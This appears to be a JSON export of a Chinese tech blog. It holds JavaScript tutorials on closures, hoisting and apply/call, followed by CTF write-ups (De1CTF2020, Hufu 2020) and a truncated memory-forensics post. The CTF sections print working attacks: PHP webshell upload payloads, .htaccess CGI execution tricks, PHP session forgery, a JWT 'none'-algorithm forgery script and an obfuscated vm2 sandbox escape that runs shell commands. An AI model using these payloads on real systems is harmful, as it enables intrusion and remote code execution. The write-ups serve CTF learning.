var sayHi = sayGreeting(&quot;Hi&quot;);var sayHiToHarry = sayHi(&quot;Harry&quot;); console.log(sayHiToHarry); // Hi, my friend Harry var sayHello = sayGreeting(&quot;Hello&quot;);var sayHelloToPeter = sayHello(&quot;Peter&quot;); console.log(sayHelloToPeter); // Hello, my friend Peter 在上述代码中，我们用参数&quot;Hi&quot;或者&quot;Hello&quot;调用函数sayGreeting，在函数sayGreeting结束之后，在闭包sayGreetingTo中仍然能够访问参数greeting和变量prefix。 2.2 闭包中包含指向外面函数的引用。例如： 12345678910111213141516171819202122232425262728293031function counter (initialValue) &#123; var privateValue = initialValue; function changeBy(delta) &#123; privateValue += delta; &#125; return &#123; increament: function() &#123; changeBy(1); &#125;, decreament: function() &#123; changeBy(-1); &#125;, getValue: function() &#123; return privateValue; &#125; &#125;&#125; var counter1 = counter(5);var counter2 = counter(5); counter1.increament();counter1.increament();console.log(counter1.getValue()); // 7 counter1.decreament();console.log(counter1.getValue()); // 6 console.log(counter2.getValue()); // 5 在上面的代码中，3个闭包函数increament、decreament和getValue都嵌套在函数counter里面，都能访问定义在counter里的其他函数以及变量。定义在外面函数中的变量(privateValue)的值能在调用之后得以保存。因此两次调用counter1.increament之后再调用getValue的结果是7。 两次调用counter得到的两个不同对象，它们之间的运行环境（例如counter函数中的变量privateValue等）没有共享。因此在counter1上调用increament或者decreament对counter2没有影响。 上述代码还演示了闭包的一个作用：模拟私有变量和函数。在上述代码中，函数counter中的变量privateValue以及函数changeBy在函数counter之外都不能访问。 2.3 当多个闭包在一个循环中创建时，很多人都会犯错误。例如如下代码： 123456789101112131415function getNumberFuncs(length) &#123; var numberFuncs = []; for(var i = 0; i &lt; length; ++i) &#123; numberFuncs[i] = function() &#123; return i; &#125;; &#125; return numberFuncs;&#125;var numberFuncs = getNumberFuncs(3);for(var i = 0; i &lt; numberFuncs.length; ++i) &#123; var number = numberFuncs[i](); console.log(number);&#125; 上述代码期待的输出可能是3行，分别为0、1和2。然而，上述代码的实际输出的3行都是3。这是因为三个闭包函数都通过引用使用了printNumber函数中的变量i。当函数printNumber执行结束之后，i的值是3。因此三个闭包函数再试图输出i时，输出的数值都是3。 我们可以使用立即调用函数机制（Immediately Invoked Function Expression, IIFE）来解决这个问题。修改之后的代码为： 123456789101112131415function getNumberFuncs(length) &#123; var numberFuncs = []; for(var i = 0; i &lt; length; ++i) &#123; numberFuncs[i] = function(j) &#123; return j; &#125;(i); &#125; return numberFuncs;&#125;var numberFuncs = getNumberFuncs(3);for(var i = 0; i &lt; numberFuncs.length; ++i) &#123; var number = numberFuncs[i]; console.log(number);&#125; 3.1 闭包的一个作用是给函数以参数之外的形式传入数据。有些API的参数是其他函数，但是没有预留位置给函数传入参数。例如，函数setTimeout、setInterval有两个参数，第一个参数是一个函数，第二个是以毫秒为单位的时间。当传给setTimeout、setInterval的函数也有自己的参数的时候，就有可能有问题。比如如下代码： 12345function printNumber(number) &#123; console.log(number);&#125; setInterval(printNumber, 1000); // undefined 由于没有给printNumber传入参数，因此每隔1秒钟之后实际输出的都是undefined。 我们可以用闭包解决这种类型的问题。修改之后的代码如下所示： 12345678function printNumberFunc(number) &#123; return function() &#123; console.log(number); &#125;&#125; var func = printNumberFunc(20);setInterval(func, 1000); // 20 很多JavaScript的新手会试图直接给setInterval中printNumber以如下形式传入参数： 12345function printNumber(number) &#123; console.log(number);&#125; setInterval(printNumber(20), 1000); 这样调用setInterval的结果是最终只输出一行20。这是因为上述代码只是调用了一次printNumber(20)。由于printNumber没有返回值，因此并没有给函数setInterval传入一个函数。 3.2 闭包的另一个作用是封装数据，这些数据只有闭包函数才能访问。 假如我们需要一个函数把一个人的名字和邮件地址生成HTML表格中的一行。例如输入&quot;Harry&quot;和&quot;harry@abcd.com&quot;，则输出&quot;&lt;tr&gt;&lt;td&gt;Harry&lt;/td&gt;&lt;td&gt;harry@abcd.com&lt;/td&gt;&lt;/tr&gt;&quot;。下面这个函数可以完成这一功能 123456789101112131415function getRowData(name, email) &#123; var rowTemplate = [&quot;&lt;tr&gt;&lt;td&gt;&quot;, &quot;&quot;, // placeholder for name &quot;&lt;/td&gt;&lt;td&gt;&quot;, &quot;&quot;, // placeholder for email &quot;&lt;/td&gt;&lt;/tr&gt;&quot;]; rowTemplate[1] = name; rowTemplate[3] = email; return rowTemplate.join(&quot;&quot;);&#125; var row = getRowData(&quot;Harry&quot;, &quot;harry@abcd.com&quot;);console.log(row); 上面的函数有一个缺点：每一次调用函数getRowData的时候都会生成一个rowTemplate对象。虽然这些对象会被GC释放掉，但生成和释放对象都是需要时间开销。我们需要尽量减少不必要的开销。 一个办法把rowTemplate从函数getRowData中移出来，变成： 123456789101112131415var rowTemplate = [&quot;&lt;tr&gt;&lt;td&gt;&quot;, &quot;&quot;, // placeholder for name &quot;&lt;/td&gt;&lt;td&gt;&quot;, &quot;&quot;, // placeholder for email &quot;&lt;/td&gt;&lt;/tr&gt;&quot;]; function getRowData(name, email) &#123; rowTemplate[1] = name; rowTemplate[3] = email; return rowTemplate.join(&quot;&quot;);&#125; var row = getRowData(&quot;Harry&quot;, &quot;harry@abcd.com&quot;);console.log(row); 这样多次调用函数getRowData使用的都是同一个rowTemplate对象。不必要的开销是消除了，但我们引入了一个新的全局变量。每引入一个全局变量，就增加了变量名字冲突的可能。因此我们需要尽量减少全局变量的数目。 如果我们使用闭包，则既可以避免重复生成rowTemplate对象，又不引入新的全局变量。下面是利用闭包实现同样的功能 1234567891011121314151617var getRowData = (function() &#123; var rowTemplate = [&quot;&lt;tr&gt;&lt;td&gt;&quot;, &quot;&quot;, // placeholder for name &quot;&lt;/td&gt;&lt;td&gt;&quot;, &quot;&quot;, // placeholder for email &quot;&lt;/td&gt;&lt;/tr&gt;&quot;]; return function(name, email) &#123; rowTemplate[1] = name; rowTemplate[3] = email; return rowTemplate.join(&quot;&quot;); &#125;;&#125;)(); var row = getRowData(&quot;Harry&quot;, &quot;harry@abcd.com&quot;);console.log(row); 我们定义了一个匿名函数，该匿名函数是一个立即调用函数，函数的返回值是另一个函数。getRowData指向这个返回的函数。我们仍然可以通过getRowData调用函数根据人名和邮件地址生成HTML表格中的一行数据。由于立即调用函数只会调用一次，因此只会生成一个rowTemplate对象。 https://www.jianshu.com/p/f7abecee0691 https://blog.csdn.net/haitaohe/article/details/17380155"},{"title":"JS变量和函数声明的提升","date":"2020-05-06","updated":"2024-03-19","path":"2020/05/06/JS变量和函数声明的提升/","text":"可参考(1)关于Javascript的函数声明和函数表达式 (2)关于JavaScript的变量提升 在Javascript中，定义函数有两种类型 函数声明 1234// 函数声明function wscat(type) &#123; return type === &quot;wscat&quot;;&#125; 函数表达式 1234// 函数表达式var oaoafly = function(type) &#123; return type === &quot;oaoafly&quot;;&#125; 先看下面这个经典问题，在一个程序里面同时用函数声明和函数表达式定义一个名为getName的函数 123456789getName() //oaoaflyvar getName = function() &#123; console.log(&#x27;wscat&#x27;)&#125;getName() //wscatfunction getName() &#123; console.log(&#x27;oaoafly&#x27;)&#125;getName() //wscat 上面的代码看起来很类似，感觉也没什么太大差别。但实际上，Javascript函数上的一个“陷阱”就体现在Javascript两种类型的函数定义上。 JavaScript 解释器中存在一种变量声明被提升的机制，也就是说函数声明会被提升到作用域的最前面，即使写代码的时候是写在最后面，也还是会被提升至最前面。 而用函数表达式创建的函数是在运行时进行赋值，且要等到表达式赋值完成后才能调用 var getName //变量被提升，此时为undefined getName() //oaoafly 函数被提升 这里受函数声明的影响，虽然函数声明在最后可以被提升到最前面了 var getName = function() { console.log(‘wscat’) } //函数表达式此时才开始覆盖函数声明的定义 getName() //wscat function getName() { console.log(‘oaoafly’) } getName() //wscat 这里就执行了函数表达式的值 所以可以分解为这两个简单的问题来看清楚区别的本质 123456var getName;console.log(getName) //undefinedgetName() //Uncaught TypeError: getName is not a functionvar getName = function() &#123; console.log(&#x27;wscat&#x27;)&#125; ​ 123456var getName;console.log(getName) //function getName() &#123;console.log(&#x27;oaoafly&#x27;)&#125;getName() //oaoaflyfunction getName() &#123; console.log(&#x27;oaoafly&#x27;)&#125; 这个区别看似微不足道，但在某些情况下确实是一个难以察觉并且“致命“的陷阱。出现这个陷阱的本质原因体现在这两种类型在函数提升和运行时机（解析时/运行时）上的差异。 当然我们给一个总结：Javascript中函数声明和函数表达式是存在区别的，函数声明在JS解析时进行函数提升，因此在同一个作用域内，不管函数声明在哪里定义，该函数都可以进行调用。而函数表达式的值是在JS运行时确定，并且在表达式赋值完成后，该函数才能调用。 1234567console.log( Foo )function Foo() &#123; console.log(1);&#125;var Foo = 1// 输出1 https://www.cnblogs.com/yangguoe/p/8052110.html"},{"title":"JS-apply和call","date":"2020-05-06","updated":"2024-03-19","path":"2020/05/06/JS-apply和call-1/","text":""},{"title":"JS-apply和call","date":"2020-05-06","updated":"2024-03-19","path":"2020/05/06/JS-apply和call/","text":"Js apply方法详解 apply和call的区别在哪里 什么情况下用apply,什么情况下用call apply的其他巧妙用法（一般在什么情况下可以使用apply） 关于apply和call的定义: apply:方法能劫持另外一个对象的方法，继承另外一个对象的属性. 123Function.apply(obj,args)方法能接收两个参数obj：这个对象将代替Function类里this对象args：这个是数组，它将作为参数传给Function（args--&gt;arguments） call:和apply的意思一样,只不过是参数列表不一样. Function.call(obj,[param1[,param2[,…[,paramN]]]]) obj：这个对象将代替Function类里this对象 params：这个是一个参数列表 1.apply示例: 12345678910111213141516&lt;script type=&quot;text/javascript&quot;&gt; /*定义一个人类*/ function Person(name,age) &#123; this.name=name; this.age=age; &#125; /*定义一个学生类*/ functionStudent(name,age,grade) &#123; Person.apply(this,arguments); this.grade=grade; &#125; //创建一个学生类 var student=new Student(&quot;qian&quot;,21,&quot;一年级&quot;); //测试 alert(&quot;name:&quot;+student.name+&quot;\\n&quot;+&quot;age:&quot;+student.age+&quot;\\n&quot;+&quot;grade:&quot;+student.grade); //大家可以看到测试结果name:qian age:21 grade:一年级 //学生类里面我没有给name和age属性赋值啊,为什么又存在这两个属性的值呢,这个就是apply的神奇之处. &lt;/script&gt; 分析: Person.apply(this,arguments); this:在创建对象在这个时候代表的是student arguments:是一个数组,也就是[“qian”,”21”,”一年级”]; 也就是通俗一点讲就是:用student去执行Person这个类里面的内容,在Person这个类里面存在this.name等之类的语句,这样就将属性创建到了student对象里面 2.call示例 在Studen函数里面可以将apply中修改成如下: Person.call(this,name,age); 这样就ok了 3.什么情况下用apply,什么情况下用call 在给对象参数的情况下,如果参数的形式是数组的时候,比如apply示例里面传递了参数arguments,这个参数是数组类型,并且在调用Person的时候参数的列表是对应一致的(也就是Person和Student的参数列表前两位是一致的) 就可以采用 apply , 如果我的Person的参数列表是这样的(age,name),而Student的参数列表是(name,age,grade),这样就可以用call来实现了,也就是直接指定参数列表对应值的位置(Person.call(this,age,name,grade)); 4.apply的一些其他巧妙用法 细心的人可能已经察觉到,在我调用apply方法的时候,第一个参数是对象(this), 第二个参数是一个数组集合, 在调用Person的时候,他需要的不是一个数组,但是为什么他给我一个数组我仍然可以将数组解析为一个一个的参数, 这个就是apply的一个巧妙的用处,可以将一个数组默认的转换为一个参数列表([param1,param2,param3] 转换为 param1,param2,param3) 这个如果让我们用程序来实现将数组的每一个项,来装换为参数的列表,可能都得费一会功夫,借助apply的这点特性,所以就有了以下高效率的方法: a)Math.max 可以实现得到数组中最大的一项 因为Math.max 参数里面不支持Math.max([param1,param2]) 也就是数组 但是它支持Math.max(param1,param2,param3…),所以可以根据刚才apply的那个特点来解决 var max=Math.max.apply(null,array),这样轻易的可以得到一个数组中最大的一项 (apply会将一个数组装换为一个参数接一个参数的传递给方法) 这块在调用的时候第一个参数给了一个null,这个是因为没有对象去调用这个方法,我只需要用这个方法帮我运算,得到返回的结果就行,.所以直接传递了一个null过去 b)Math.min 可以实现得到数组中最小的一项 同样和 max是一个思想 var min=Math.min.apply(null,array); c)Array.prototype.push 可以实现两个数组合并 同样push方法没有提供push一个数组,但是它提供了push(param1,param,…paramN) 所以同样也可以通过apply来装换一下这个数组,即: 123var arr1=new Array(&quot;1&quot;,&quot;2&quot;,&quot;3&quot;); var arr2=new Array(&quot;4&quot;,&quot;5&quot;,&quot;6&quot;); Array.prototype.push.apply(arr1,arr2); 也可以这样理解,arr1调用了push方法,参数是通过apply将数组装换为参数列表的集合. 通常在什么情况下,可以使用apply类似Math.min等之类的特殊用法: 一般在目标函数只需要n个参数列表,而不接收一个数组的形式([param1[,param2[,…[,paramN]]]])可以通过apply的方式巧妙地解决这个问题!"},{"title":"JS-this指向","date":"2020-05-06","updated":"2024-03-19","path":"2020/05/06/JS-this指向/","text":"https://www.cnblogs.com/qdjianghao/p/10177360.html"},{"title":"De1CTF2020","date":"2020-05-05","updated":"2024-03-19","path":"2020/05/05/De1CTF2020/","text":"Check in 抓包，随便上传了个马，发现存在内容黑名单 过滤了ph，尝试用短标签绕过 本地测试了下，这样的短标签可以执行任意系统命令，system也可以 非预期解1 于是我们去选择构造如下的payload上传，让他直接执行命令 最终读到flag De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll} 非预期解2 利用apache的服务器状态信息(默认关闭) .htaccess : 1SetHandler server-status 上传文件后，访问自己的目录就发现是apache的服务器状态信息，可以看到其他人的访问本网站的记录，可以利用次方法，可以白嫖flag。 其他payload 12345Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;xx.txt&quot;Content-Type: image/jpeg&lt;?=`$_GET[1]`;xx.txt?1=cat /flag; 其他payload 123456789Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;.htaccess&quot;Content-Type: image/jpegAddType application/x-httpd-p\\hp .qiuContent-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.qiu&quot;Content-Type: image/jpeg&lt;?=eval($_POST[1]); 解法二(预期解) https://ctftime.org/writeup/20442 https://httpd.apache.org/docs/2.4/howto/htaccess.html#cgi 将某些文件扩展名指定为cgi-bin，并在服务器上执行shell。 upload .htaccess 1234Content-Disposition: form-data; name=&quot;ﬁleUpload&quot;; ﬁlename=&quot;.htaccess&quot; Content-Type: image/pngOptions +ExecCGI AddHandler cgi-script .cc and got: 123&lt;strong&gt;Your ﬁles :.htaccess&lt;br&gt;&lt;/strong&gt; &lt;/br&gt; &lt;strong&gt;Your dir : uploads/f2b591ce3a731e2e59eaf2bf5d6a5738 &lt;br&gt;&lt;/strong&gt; I then uploaded 1.cc: 123456789101112Content-Disposition: form-data; name=&quot;ﬁleUpload&quot;; ﬁlename=&quot;1.cc&quot; Content-Type: image/png#!/bin/bashecho &quot;Content-Type: text/plain&quot;echo &quot;&quot;ls -lah /exit 0 注意: 这里讲下一个小坑，上传中可能出现500错误 linux中cgi比较严格,上传后发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。 随便上传一个文件然后拦截修改内容和文件名为htaccess后发现也不能正常解析,只有把htacess文件内容提前在本地写好,上传时拦截改个文件名然后上传才能成功解析 注意: 必须要有echo &quot;Content-type:text/html&quot; https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp https://github.com/empty-jack/ctf-writeups/blob/master/De1CTF/web-check-in.md https://httpd.apache.org/docs/trunk/howto/cgi.html#troubleshoot https://blog.de1ta.club/2020/05/06/de1ctf2020 Writeup/#web"},{"title":"虎符2020","date":"2020-04-30","updated":"2024-03-19","path":"2020/04/30/虎符2020/","text":"babyupload 打开页面，发现给出了源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 &lt;?phperror_reporting(0);session_save_path(&quot;/var/babyctf/&quot;);session_start();require_once &quot;/flag&quot;;highlight_file(__FILE__);if($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)&#123; $filename=&#x27;/var/babyctf/success.txt&#x27;; if(file_exists($filename))&#123; safe_delete($filename); die($flag); &#125;&#125;else&#123; $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;&#125;$direction = filter_input(INPUT_POST, &#x27;direction&#x27;);$attr = filter_input(INPUT_POST, &#x27;attr&#x27;);$dir_path = &quot;/var/babyctf/&quot;.$attr;if($attr===&quot;private&quot;)&#123; $dir_path .= &quot;/&quot;.$_SESSION[&#x27;username&#x27;];&#125;if($direction === &quot;upload&quot;)&#123; try&#123; if(!is_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]))&#123; throw new RuntimeException(&#x27;invalid upload&#x27;); &#125; $file_path = $dir_path.&quot;/&quot;.$_FILES[&#x27;up_file&#x27;][&#x27;name&#x27;]; $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]); if(preg_match(&#x27;/(../|..\\\\)/&#x27;, $file_path))&#123; throw new RuntimeException(&#x27;invalid file path&#x27;); &#125; @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;],$file_path))&#123; $upload_result = &quot;uploaded&quot;; &#125;else&#123; throw new RuntimeException(&#x27;error while saving&#x27;); &#125; &#125; catch (RuntimeException $e) &#123; $upload_result = $e-&gt;getMessage(); &#125;&#125; elseif ($direction === &quot;download&quot;) &#123; try&#123; $filename = basename(filter_input(INPUT_POST, &#x27;filename&#x27;)); $file_path = $dir_path.&quot;/&quot;.$filename; if(preg_match(&#x27;/(../|..\\\\)/&#x27;, $file_path))&#123; throw new RuntimeException(&#x27;invalid file path&#x27;); &#125; if(!file_exists($file_path)) &#123; throw new RuntimeException(&#x27;file not exist&#x27;); &#125; header(&#x27;Content-Type: application/force-download&#x27;); header(&#x27;Content-Length: &#x27;.filesize($file_path)); header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.substr($filename, 0, -65).&#x27;&quot;&#x27;); if(readfile($file_path))&#123; $download_result = &quot;downloaded&quot;; &#125;else&#123; throw new RuntimeException(&#x27;error while saving&#x27;); &#125; &#125; catch (RuntimeException $e) &#123; $download_result = $e-&gt;getMessage(); &#125; exit;&#125;?&gt; 读代码，发现这是一个存在上传和下载文件的功能。 获取flag的条件： 1.$_SESSION['username'] ==='admin') 存在/var/babyctf/success.txt 我们一步一步来： 使$_SESSION['username'] ==='admin')，我们发现没有什么代码和修改这个变量值的，但是在代码开头设置了保存session文件的路径： 12session_save_path(&quot;/var/babyctf/&quot;);session_start(); 通过session文件的命名规则，可以推断session文件为：/var/babyctf/sess_XXXXX(为PHPSESSID的值)。。 我们尝试读取一下，session文件： post： 1direction=download&amp;filename=sess_a41c14e052970b6a0af81246c69b552d 内容为： 1&lt;0x08&gt;usernames:5:&quot;guest&quot;; 猜测我们只要上传一个session文件内容为： 1&lt;0x08&gt;usernames:5:&quot;admin&quot;; 并且命名为：sess_XXXXXXXXXX，然后设置PHPSESSID就可以使得$_SESSION['username'] ==='admin')成立了。 分析上传代码发现： 发现如果不上传attr参数，dir_path会直接拼接上传的文件名+&quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES['up_file']['tmp_name']); 如果把上传文件名设置为sess，并且不传递attr参数，就可以得到/var/babyctf/sess_XXXXXXXXX，这就可以当成session文件。。 hash_file(&quot;sha256&quot;,$_FILES['up_file']['tmp_name'])，虽然tmp_name是不可控的随机值，但是hash_file()是根据文件内容得到的hash值。就是说文件内容可控，那么文件名就是可控的了。 在本地创建一个文件名为sess: 在本地写一个上传页面： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;题目地址&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;attr&quot; /&gt; &lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;direction&quot; /&gt; &lt;br&gt; &lt;input type=&quot;file&quot; name=&quot;up_file&quot; /&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/body&gt;&lt;/html&gt; 抓包上传文件： 获取上传文件的hash_file值 1234567&lt;?php echo hash_file(&quot;sha256&quot;,&quot;./sess&quot;); ?&gt;输出：432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4 尝试读一下sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4看是否写成功： 然后就差success.txt了。 可以把attr参数设置为success.txt。 可以将success.txt变成一个目录。从而绕过了限制。 然后将PHPSESSID修改为432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4,就可以得到flag。 easy_login 打开是一个登陆框的界面，通过题目的描述知道是一个nodejs写的网站。 查看/static/js/app.js源代码发现： 看注释静态映射到了根目录，猜测可以读取源码，访问app.js,controller.js 可以看到源码 app.js 12345678910111213141516171819202122232425262728293031323334353637const Koa = require(&#x27;koa&#x27;);const bodyParser = require(&#x27;koa-bodyparser&#x27;);const session = require(&#x27;koa-session&#x27;);const static = require(&#x27;koa-static&#x27;);const views = require(&#x27;koa-views&#x27;);const crypto = require(&#x27;crypto&#x27;);const &#123; resolve &#125; = require(&#x27;path&#x27;);const rest = require(&#x27;./rest&#x27;);const controller = require(&#x27;./controller&#x27;);const PORT = 80;const app = new Koa();app.keys = [crypto.randomBytes(16).toString(&#x27;hex&#x27;)];global.secrets = [];app.use(static(resolve(__dirname, &#x27;.&#x27;)));app.use(views(resolve(__dirname, &#x27;./views&#x27;), &#123; extension: &#x27;pug&#x27;&#125;));app.use(session(&#123;key: &#x27;sses:aok&#x27;, maxAge: 86400000&#125;, app));// parse request body:app.use(bodyParser());// prepare restful serviceapp.use(rest.restify());// add controllers:app.use(controller());app.listen(PORT);console.log(`app started at port $&#123;PORT&#125;...`); 然后测试出还有/controllers/api.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586const crypto = require(&#x27;crypto&#x27;);const fs = require(&#x27;fs&#x27;)const jwt = require(&#x27;jsonwebtoken&#x27;)const APIError = require(&#x27;../rest&#x27;).APIError;module.exports = &#123; &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || username === &#x27;admin&#x27;)&#123; throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;); &#125; if(global.secrets.length &gt; 100000) &#123; global.secrets = []; &#125; const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || !password) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;); &#125; const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;); &#125; const secret = global.secrets[sid]; const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); const status = username === user.username &amp;&amp; password === user.password; if(status) &#123; ctx.session.username = username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123; if(ctx.session.username !== &#x27;admin&#x27;)&#123; throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;); &#125; const flag = fs.readFileSync(&#x27;/flag&#x27;).toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123; ctx.session.username = null; ctx.rest(&#123; status: true &#125;) await next(); &#125;&#125;; 代码审计一下，发现是jwt加密验证。 一些jwt库支持none算法，将算法修改为none，即没有签名算法。当alg字段被修改为none时，后端若是支持none算法，后端不会进行签名验证。 做法：将header中的alg字段可被修改为none，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’） 然后直接提交到服务端去即可。。 只要想办法令secret为undefined就可以使用none签名校验了。。 js的一些特性： 可以让secectid为0.1来进行绕过。 先注册一个账号，抓取一下jwt进行解密。。jwt解密链接 网站上的不能将alg设置为none，用脚本进行加密： 12345678#encoding=utf-8import base64def b64urlencode(data): return base64.b64encode(data).replace(&#x27;+&#x27;, &#x27;-&#x27;).replace(&#x27;/&#x27;, &#x27;_&#x27;).replace(&#x27;=&#x27;, &#x27;&#x27;)print b64urlencode(&quot;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;&#125;&quot;) + &#x27;.&#x27; + b64urlencode(&quot;&#123;&quot;secretid&quot;:&quot;0.1&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125;&quot;) + &#x27;.&#x27; 脚本生成jwt加密字符串eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IjAuMDEiLCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYifQ. 然后尝试admin登陆，进行抓包： 发现登陆成功，放包 发现成功使用admin登陆了，然后点击getflag发现没有反应。。 然后再次抓包得到flag… just_escape 打开页面发现： 访问run.php得到源码： 12345678 &lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123; $code = $_GET[&#x27;code&#x27;]; echo eval(code);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 天真的我，以为是php命令执行绕过。。。 尝试了一下phpinfo()发现： 再看了看提示，发现不是php。 仔细看了下代码 eval里的code这个细节猜测应该是js写的，php是假象 验证后发现，code执行的确实是js的代码。。。 科学上网发现了这么一篇文章：https://www.anquanke.com/post/id/170708?display=mobile 访问/run.php?code=Error().stack得到: 1234567891011Error at vm.js:1:1 at ContextifyScript.Script.runInContext (vm.js:59:29) at VM.run (/usr/src/app/node_modules/vm2/lib/main.js:219:62) at /usr/src/app/server.js:51:33 at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5) at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5) at /usr/src/app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/usr/src/app/node_modules/express/lib/router/index.js:335:12) 发现题目设置的模块vm.js，然后发现对应的vm2仓库里已经有很多 escape 的 issue 了 找到了这个 https://github.com/patriksimek/vm2/issues/225 直接输入代码： 发现返回了一个键盘的页面。。 测试发现过滤了一些关键字：单引号、双引号、exec、prototype等等，会被拦截，然后返回这个键盘页面。。。 测试发现可以通过十六进制编码来进行关键字绕过： 1(function()&#123;TypeError[`x70x72x6fx74x6fx74x79x70x65`][`x67x65x74x5fx70x72x6fx63x65x73x73`] = f=&gt;f[`x63x6fx6ex73x74x72x75x63x74x6fx72`](`x72x65x74x75x72x6ex20x70x72x6fx63x65x73x73`)();try&#123;Object.preventExtensions(Buffer.from(``)).a = 1;&#125;catch(e)&#123;return e[`x67x65x74x5fx70x72x6fx63x65x73x73`](()=&gt;&#123;&#125;).mainModule.require((`x63x68x69x6cx64x5fx70x72x6fx63x65x73x73`))[`x65x78x65x63x53x79x6ex63`](`whoami`).toString();&#125;&#125;)() 修改要执行的命令，就能得到flag了 payload: 1(function()&#123;TypeError[`x70x72x6fx74x6fx74x79x70x65`][`x67x65x74x5fx70x72x6fx63x65x73x73`] = f=&gt;f[`x63x6fx6ex73x74x72x75x63x74x6fx72`](`x72x65x74x75x72x6ex20x70x72x6fx63x65x73x73`)();try&#123;Object.preventExtensions(Buffer.from(``)).a = 1;&#125;catch(e)&#123;return e[`x67x65x74x5fx70x72x6fx63x65x73x73`](()=&gt;&#123;&#125;).mainModule.require((`x63x68x69x6cx64x5fx70x72x6fx63x65x73x73`))[`x65x78x65x63x53x79x6ex63`](`cat%20/flag`).toString();&#125;&#125;)() https://www.anquanke.com/post/id/203417#h2-2"},{"title":"内存取证","date":"2020-04-30","updated":"2024-03-19","path":"2020/04/30/内存取证/","text":"123456789101112131415root@kali:~# volatility -f /root/桌面/mem.dump imageinfo //获取dump的版本Volatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/root/桌面/mem.dump) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80003e02110L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80003e03d00L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2019-11-13 08:39:44 UTC+0000 Image local date and time : 2019-11-13 16:39:44 +0800 Win7SP1x64的dump 之后的命令需使用 Bash 1volatility -f 文件名 --profile dump的系统版本 命令 Bash 12345678910111213141516171819202122232425262728293031323334353637383940414243444546root@kali:~# volatility -f /root/桌面/mem.dump --profile=Win7SP1x64 pslistVolatility Foundation Volatility Framework 2.6Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ------------------ -------------------- ------ ------ 